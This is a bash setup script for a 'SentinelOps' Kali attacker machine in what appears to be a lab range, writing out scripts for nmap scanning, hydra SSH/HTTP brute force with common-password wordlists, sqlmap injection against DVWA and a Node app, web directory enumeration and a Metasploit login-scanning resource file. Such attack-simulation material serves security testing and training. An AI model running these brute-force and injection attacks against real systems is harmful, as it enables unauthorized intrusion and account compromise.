#!/bin/bash
# =============================================================================
# SentinelOps - Attacker Machine (Kali) Setup Script
# =============================================================================
# This script installs and configures attack tools:
# - nmap
# - hydra
# - sqlmap
# - metasploit
# - nikto
# - Custom attack scripts
# =============================================================================

set -e

# Logging
exec > >(tee /var/log/attacker-setup.log) 2>&1
echo "=== SentinelOps Attacker Machine Setup Started ==="
echo "Timestamp: $(date)"

# =============================================================================
# SYSTEM UPDATE
# =============================================================================
echo ">>> Updating system packages..."
apt-get update && apt-get upgrade -y

# =============================================================================
# INSTALL/UPDATE ATTACK TOOLS
# =============================================================================
echo ">>> Installing attack tools..."

# Most tools come pre-installed on Kali, but we ensure they're up to date
apt-get install -y \
  nmap \
  hydra \
  sqlmap \
  nikto \
  dirb \
  gobuster \
  wfuzz \
  burpsuite \
  zaproxy \
  john \
  hashcat \
  aircrack-ng \
  wireshark \
  tcpdump \
  netcat-traditional \
  python3-pip \
  git

# Install Metasploit (if not present)
if ! command -v msfconsole &> /dev/null; then
  echo ">>> Installing Metasploit..."
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  chmod +x msfinstall
  ./msfinstall
fi

# Update Metasploit
msfupdate || true

# =============================================================================
# INSTALL ADDITIONAL PYTHON TOOLS
# =============================================================================
echo ">>> Installing Python security tools..."
pip3 install --upgrade pip
pip3 install \
  impacket \
  pwntools \
  requests \
  beautifulsoup4 \
  paramiko \
  scapy

# =============================================================================
# CREATE SENTINELOPS ATTACK SCRIPTS DIRECTORY
# =============================================================================
echo ">>> Creating SentinelOps attack scripts..."
mkdir -p /opt/sentinelops/attacks
mkdir -p /opt/sentinelops/wordlists
mkdir -p /opt/sentinelops/results

# =============================================================================
# CREATE ATTACK SCRIPTS
# =============================================================================

# Main attack runner script
cat > /opt/sentinelops/attacks/run_attacks.sh <<'EOF'
#!/bin/bash
# =============================================================================
# SentinelOps - Attack Runner
# =============================================================================
# Usage: ./run_attacks.sh <target_ip> [attack_type]
# Attack types: recon, brute, sqli, web, all
# =============================================================================

TARGET=${1:-"10.0.1.100"}
ATTACK_TYPE=${2:-"recon"}
RESULTS_DIR="/opt/sentinelops/results/$(date +%Y%m%d_%H%M%S)"

mkdir -p "$RESULTS_DIR"

echo "=============================================="
echo "SentinelOps Attack Simulation"
echo "Target: $TARGET"
echo "Attack Type: $ATTACK_TYPE"
echo "Results: $RESULTS_DIR"
echo "=============================================="

run_recon() {
    echo "[*] Running reconnaissance..."
    
    # Port scan
    echo "[+] Nmap port scan..."
    nmap -sV -sC -oA "$RESULTS_DIR/nmap_full" "$TARGET"
    
    # Service enumeration
    echo "[+] Service enumeration..."
    nmap -sV --version-intensity 5 -oA "$RESULTS_DIR/nmap_services" "$TARGET"
    
    # Vulnerability scan
    echo "[+] Vulnerability scan..."
    nmap --script vuln -oA "$RESULTS_DIR/nmap_vuln" "$TARGET"
}

run_brute() {
    echo "[*] Running brute force attacks..."
    
    # SSH brute force
    echo "[+] SSH brute force..."
    hydra -L /opt/sentinelops/wordlists/users.txt \
          -P /opt/sentinelops/wordlists/passwords.txt \
          ssh://"$TARGET" \
          -o "$RESULTS_DIR/hydra_ssh.txt" \
          -t 4 || true
    
    # HTTP brute force
    echo "[+] HTTP brute force..."
    hydra -L /opt/sentinelops/wordlists/users.txt \
          -P /opt/sentinelops/wordlists/passwords.txt \
          http-get://"$TARGET":8080 \
          -o "$RESULTS_DIR/hydra_http.txt" \
          -t 4 || true
}

run_sqli() {
    echo "[*] Running SQL injection attacks..."
    
    # SQLMap against DVWA
    echo "[+] SQLMap scan..."
    sqlmap -u "http://$TARGET:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --batch \
           --output-dir="$RESULTS_DIR/sqlmap" \
           --level=3 \
           --risk=2 || true
    
    # SQLMap against Node app
    sqlmap -u "http://$TARGET:4000/user?id=1" \
           --batch \
           --output-dir="$RESULTS_DIR/sqlmap_node" || true
}

run_web() {
    echo "[*] Running web vulnerability scans..."
    
    # Nikto scan
    echo "[+] Nikto scan..."
    nikto -h "http://$TARGET:8080" -o "$RESULTS_DIR/nikto_dvwa.txt" || true
    nikto -h "http://$TARGET:3000" -o "$RESULTS_DIR/nikto_juice.txt" || true
    
    # Directory brute force
    echo "[+] Directory enumeration..."
    dirb "http://$TARGET:8080" /usr/share/dirb/wordlists/common.txt \
         -o "$RESULTS_DIR/dirb_dvwa.txt" || true
    
    # Gobuster
    gobuster dir -u "http://$TARGET:3000" \
             -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
             -o "$RESULTS_DIR/gobuster_juice.txt" || true
}

case $ATTACK_TYPE in
    recon)
        run_recon
        ;;
    brute)
        run_brute
        ;;
    sqli)
        run_sqli
        ;;
    web)
        run_web
        ;;
    all)
        run_recon
        run_brute
        run_sqli
        run_web
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Valid types: recon, brute, sqli, web, all"
        exit 1
        ;;
esac

echo ""
echo "=============================================="
echo "Attack simulation complete!"
echo "Results saved to: $RESULTS_DIR"
echo "=============================================="
EOF
chmod +x /opt/sentinelops/attacks/run_attacks.sh

# Individual attack scripts
cat > /opt/sentinelops/attacks/nmap_scan.sh <<'EOF'
#!/bin/bash
# Quick Nmap scan
TARGET=${1:-"10.0.1.100"}
echo "[*] Running Nmap scan on $TARGET"
nmap -sV -sC -A "$TARGET"
EOF
chmod +x /opt/sentinelops/attacks/nmap_scan.sh

cat > /opt/sentinelops/attacks/ssh_brute.sh <<'EOF'
#!/bin/bash
# SSH Brute Force
TARGET=${1:-"10.0.1.100"}
echo "[*] Running SSH brute force on $TARGET"
hydra -L /opt/sentinelops/wordlists/users.txt \
      -P /opt/sentinelops/wordlists/passwords.txt \
      ssh://"$TARGET" -t 4 -vV
EOF
chmod +x /opt/sentinelops/attacks/ssh_brute.sh

cat > /opt/sentinelops/attacks/sql_injection.sh <<'EOF'
#!/bin/bash
# SQL Injection Test
TARGET=${1:-"10.0.1.100"}
PORT=${2:-"4000"}
echo "[*] Running SQL injection test on $TARGET:$PORT"
sqlmap -u "http://$TARGET:$PORT/user?id=1" --batch --level=3 --risk=2
EOF
chmod +x /opt/sentinelops/attacks/sql_injection.sh

cat > /opt/sentinelops/attacks/web_scan.sh <<'EOF'
#!/bin/bash
# Web Vulnerability Scan
TARGET=${1:-"10.0.1.100"}
PORT=${2:-"8080"}
echo "[*] Running web vulnerability scan on $TARGET:$PORT"
nikto -h "http://$TARGET:$PORT"
EOF
chmod +x /opt/sentinelops/attacks/web_scan.sh

# Metasploit resource file for automated attacks
cat > /opt/sentinelops/attacks/msf_attacks.rc <<'EOF'
# Metasploit Resource File for SentinelOps
# Usage: msfconsole -r msf_attacks.rc

# Set global options
setg RHOSTS 10.0.1.100
setg RPORT 8080

# Port scan
use auxiliary/scanner/portscan/tcp
set THREADS 10
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /opt/sentinelops/wordlists/users.txt
set PASS_FILE /opt/sentinelops/wordlists/passwords.txt
set STOP_ON_SUCCESS true
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# MySQL scanner
use auxiliary/scanner/mysql/mysql_version
run

# Print results
echo "Scan complete. Check results."
EOF

# =============================================================================
# CREATE WORDLISTS
# =============================================================================
echo ">>> Creating custom wordlists..."

cat > /opt/sentinelops/wordlists/users.txt <<'EOF'
admin
root
user
test
guest
administrator
webmaster
support
info
sales
contact
demo
dev
developer
manager
operator
EOF

cat > /opt/sentinelops/wordlists/passwords.txt <<'EOF'
password
123456
admin
root
letmein
welcome
monkey
dragon
master
qwerty
login
password123
admin123
root123
test123
guest
abc123
111111
password1
admin@123
EOF

# =============================================================================
# CREATE PYTHON ATTACK TOOLS
# =============================================================================
cat > /opt/sentinelops/attacks/port_scanner.py <<'EOF'
#!/usr/bin/env python3
"""
SentinelOps - Custom Port Scanner
Usage: python3 port_scanner.py <target> [start_port] [end_port]
"""

import socket
import sys
import threading
from datetime import datetime

def scan_port(target, port, results):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            results.append(port)
        sock.close()
    except:
        pass

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "10.0.1.100"
    start_port = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1024

    print(f"\n{'='*50}")
    print(f"SentinelOps Port Scanner")
    print(f"Target: {target}")
    print(f"Port Range: {start_port}-{end_port}")
    print(f"Started: {datetime.now()}")
    print(f"{'='*50}\n")

    results = []
    threads = []

    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(target, port, results))
        threads.append(thread)
        thread.start()

        # Limit concurrent threads
        if len(threads) >= 100:
            for t in threads:
                t.join()
            threads = []

    # Wait for remaining threads
    for t in threads:
        t.join()

    print(f"\nOpen ports on {target}:")
    for port in sorted(results):
        print(f"  [+] Port {port} is OPEN")

    print(f"\nScan completed: {datetime.now()}")
    print(f"Total open ports: {len(results)}")

if __name__ == "__main__":
    main()
EOF
chmod +x /opt/sentinelops/attacks/port_scanner.py

# =============================================================================
# CREATE STATUS FILE
# =============================================================================
cat > /opt/sentinelops/status.json <<EOF
{
  "server": "attacker",
  "status": "active",
  "tools": {
    "nmap": "installed",
    "hydra": "installed",
    "sqlmap": "installed",
    "nikto": "installed",
    "metasploit": "installed",
    "burpsuite": "installed"
  },
  "attack_scripts": "/opt/sentinelops/attacks/",
  "wordlists": "/opt/sentinelops/wordlists/",
  "results": "/opt/sentinelops/results/",
  "setup_date": "$(date -Iseconds)"
}
EOF

# =============================================================================
# SETUP COMPLETE
# =============================================================================
echo "=== SentinelOps Attacker Machine Setup Complete ==="
echo "Timestamp: $(date)"
echo ""
echo "Attack tools installed:"
echo "  - nmap"
echo "  - hydra"
echo "  - sqlmap"
echo "  - nikto"
echo "  - metasploit"
echo "  - burpsuite"
echo "  - gobuster/dirb"
echo ""
echo "Custom scripts created in /opt/sentinelops/attacks/"
echo "  - run_attacks.sh <target> [recon|brute|sqli|web|all]"
echo "  - nmap_scan.sh <target>"
echo "  - ssh_brute.sh <target>"
echo "  - sql_injection.sh <target> [port]"
echo "  - web_scan.sh <target> [port]"
echo ""
echo "Check /var/log/attacker-setup.log for details"
